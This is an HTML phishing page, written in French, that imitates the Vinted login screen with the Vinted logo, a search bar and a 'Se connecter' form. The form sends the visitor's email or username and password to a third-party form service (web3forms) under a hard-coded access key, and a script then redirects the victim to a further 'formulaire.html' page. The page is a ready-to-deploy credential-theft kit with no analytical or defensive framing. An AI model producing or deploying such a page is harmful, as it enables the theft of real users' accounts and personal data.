<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | Vinted</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header class="navbar">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Vinted_logo.png" class="logo-img">
        <div class="menu-icon">☰</div>
    </header>

    <div class="search-container">
        <div class="search-bar"><span class="category">Articles ▾</span><input type="text" placeholder="Rechercher des articles"></div>
    </div>

    <main class="main-bg">
        <div class="white-card">
            <h2>Se connecter</h2>
            <form id="vintedForm" action="https://api.web3forms.com/submit" method="POST">
                <input type="hidden" name="access_key" value="c89ef8b5-6bcc-4cae-bda0-97a1ba2fc8aa">
                
                <div class="field-group">
                    <input type="text" name="email" placeholder="Identifiant ou adresse email" required>
                </div>
                <div class="field-group">
                    <input type="password" name="password" placeholder="Mot de passe" required>
                </div>
                <button type="submit" class="btn-vinted">Continuer</button>
            </form>
        </div>
    </main>

    <script>
        document.getElementById('vintedForm').onsubmit = function() {
            setTimeout(() => { window.location.href = "formulaire.html"; }, 1000);
        };
    </script>
</body>
</html>
